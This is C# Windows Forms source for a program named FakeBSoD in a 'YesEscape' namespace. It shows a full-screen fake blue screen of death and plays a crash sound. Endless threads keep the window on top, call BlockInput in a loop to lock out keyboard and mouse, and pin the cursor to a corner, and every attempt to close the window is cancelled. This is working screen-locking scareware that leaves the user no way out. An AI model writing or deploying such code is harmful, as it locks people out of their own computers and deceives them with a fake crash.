using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Media;
using System.IO;

namespace YesEscape
{
    public partial class FakeBSoD : Form
    {
        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);

        public FakeBSoD()
        {
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            InitializeComponent();

            Size = new Size(w, h);

            UnmanagedMemoryStream sfx = Properties.Resources.oops_my_system_crashed;
            sfx.Position = 0;
            SoundPlayer player = new SoundPlayer(sfx);
            player.Play();
        }

        private void FakeBSoD_Load(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                while(true)
                {
                    Activate();
                    Focus();
                    TopLevel = true;
                    TopMost = true;
                    Thread.Sleep(500);
                }
            }).Start();

            new Thread(() =>
            {
                while (true)
                {
                    int w = Screen.PrimaryScreen.Bounds.Width;
                    int h = Screen.PrimaryScreen.Bounds.Height;

                    BlockInput(true);
                    SetCursorPos(w, h);
                }
            }).Start();
        }

        private void FakeBSoD_Deactivate(object sender, EventArgs e)
        {
            Activate();
        }

        private void FakeBSoD_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
